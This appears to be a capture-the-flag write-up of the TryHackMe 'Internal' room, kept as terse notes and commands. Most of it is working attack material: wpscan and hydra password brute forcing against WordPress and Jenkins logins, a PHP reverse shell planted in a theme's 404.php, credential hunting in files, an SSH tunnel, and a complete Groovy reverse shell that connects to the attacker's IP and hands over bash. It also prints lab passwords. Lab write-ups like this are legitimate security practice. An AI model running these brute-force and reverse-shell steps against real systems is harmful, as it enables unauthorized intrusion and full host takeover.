---
title: "THM: Internal Writeup"
date: 2021-12-01
categories:
  - Write-Ups
tags:
  - writeup
  - tryhackme
  - linux
---

## NOTES
my ip : 10.4.26.163
target: 10.10.66.29

#### brute force admin user
```
wpscan --url http://internal.thm/wordpress/wp-login.php --usernames admin --passwords /tmp/rockyou.txt
```
admin : my2boys

#### in wp admin dashboard, go to Appreance>Edit template>404.php upload php rev shell

#### run reverse shell
http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php

```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```

./linpeas.sh gave following, nothing useful
```
$dbpass='B2Ud4fEOZmVq';
$dbuser='phpmyadmin';
```

```bash
find / -type f -name *.txt 2>/dev/null
cat /opt/wp-save.txt
aubreanna : bubb13guM!@#123

cd home/aubreanna
cat jenkins.txt
Jenkins service is running on 172.17.0.2:8080
```


#### now we do ssh tunnel to run this in our localhost
```bash
ssh -L 9999:172.17.0.2:8080 aubreanna@internal.thm
```

```bash
# hydra brute force
 hydra -l admin -P rockyou.txt -s 9999 127.0.0.1  http-post-form  "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
 
 admin : spongebob
```
- Run Groovy Reverse Shell in Manage Jenkins> Script Console
 ```bash
 String host="10.4.26.163";
int port=8044;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
```bash
find / -type f -name *.txt 2>/dev/null
cat /opt/note.txt
root : tr0ub13guM!@#123
```